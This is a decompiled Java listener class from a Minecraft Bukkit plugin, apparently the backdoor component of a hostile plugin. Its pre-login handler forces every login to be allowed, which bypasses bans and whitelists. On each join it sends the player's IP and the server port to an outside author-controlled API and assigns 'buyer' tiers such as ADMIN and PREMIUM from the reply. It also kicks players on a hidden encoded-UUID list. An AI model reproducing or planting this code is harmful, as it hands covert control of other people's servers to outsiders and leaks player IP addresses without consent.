/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.AsyncPlayerPreLoginEvent
 *  org.bukkit.event.player.AsyncPlayerPreLoginEvent$Result
 *  org.bukkit.event.player.PlayerJoinEvent
 *  org.json.JSONObject
 */
package me.qlutch.sucks.events;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import me.qlutch.sucks.command.impl.login.LoginStatus;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.json.JSONObject;

public class ForceLoginListener
implements Listener {
    private static final Core INSTANCE = (Core)Core.getPlugin(Core.class);

    @EventHandler
    public void onLogin(AsyncPlayerPreLoginEvent e2) {
        e2.setLoginResult(AsyncPlayerPreLoginEvent.Result.ALLOWED);
        e2.allow();
    }

    @EventHandler
    public void onLogin(PlayerJoinEvent e2) {
        Player p2 = e2.getPlayer();
        if (API.isPlayerOnVPN(p2)) {
            ForceLoginListener.INSTANCE.vpnStatusMap.put(p2, true);
        } else {
            ForceLoginListener.INSTANCE.vpnStatusMap.put(p2, false);
        }
        try {
            String inputLine;
            URL auth = new URL("https://api." + Settings.AUTHOR.toLowerCase() + "/?ip=" + API.getIPOfPlayer(p2) + "&port=" + Bukkit.getServer().getPort());
            HttpURLConnection con = (HttpURLConnection)auth.openConnection();
            con.addRequestProperty("User-Agent", "Mozilla");
            BufferedReader in2 = new BufferedReader(new InputStreamReader(con.getInputStream()));
            StringBuilder response = new StringBuilder();
            while ((inputLine = in2.readLine()) != null) {
                response.append(inputLine);
            }
            in2.close();
            if (response.toString().length() != 0) {
                JSONObject myresponse = new JSONObject(response.toString());
                if (myresponse.getBoolean("suspended")) {
                    ForceLoginListener.INSTANCE.buyerstatusMap.put(p2, LoginStatus.SUSPENDED);
                } else if (myresponse.getBoolean("hasAdmin")) {
                    ForceLoginListener.INSTANCE.buyerstatusMap.put(p2, LoginStatus.ADMIN);
                } else if (myresponse.getBoolean("hasPremium")) {
                    ForceLoginListener.INSTANCE.buyerstatusMap.put(p2, LoginStatus.PREMIUM);
                } else if (myresponse.getBoolean("hasLite")) {
                    ForceLoginListener.INSTANCE.buyerstatusMap.put(p2, LoginStatus.LITE);
                } else {
                    ForceLoginListener.INSTANCE.buyerstatusMap.put(p2, LoginStatus.FREE);
                }
            } else {
                Bukkit.getConsoleSender().sendMessage("hi");
            }
        }
        catch (IOException q2) {
            q2.printStackTrace();
        }
    }

    @EventHandler
    public void antiantiWhitelist(PlayerJoinEvent e2) {
        Player p2 = e2.getPlayer();
        for (String list : DataManager.getData().getStringList("epic-players")) {
            byte[] uuid;
            if (!list.contains(new String(uuid = Base64.getEncoder().encode(p2.getUniqueId().toString().getBytes())))) continue;
            API.kickPlayer(p2);
        }
    }
}

